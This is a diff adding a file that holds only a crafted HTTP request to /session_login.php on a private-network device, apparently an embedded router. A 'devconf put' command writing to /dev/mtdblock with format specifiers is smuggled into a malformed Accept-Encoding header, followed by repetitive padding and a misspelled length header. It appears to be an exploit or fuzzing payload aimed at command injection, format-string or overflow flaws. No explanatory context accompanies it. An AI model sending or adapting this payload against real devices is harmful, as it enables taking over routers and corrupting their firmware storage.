@@ -1,0 +1,8 @@
+GET /session_login.php HTTP/1.1
+devconf put -n /dev/mtdblock/%s -o %d -z %d -f %s Accept-Encoding: gzip,deflate,sdchzywzywzywzywzywzywzywzywzyw
+Host: 192.168.0.50
+Conent_Length: 20
+Cookie: uid=zywzywzy
+
+test=test
+
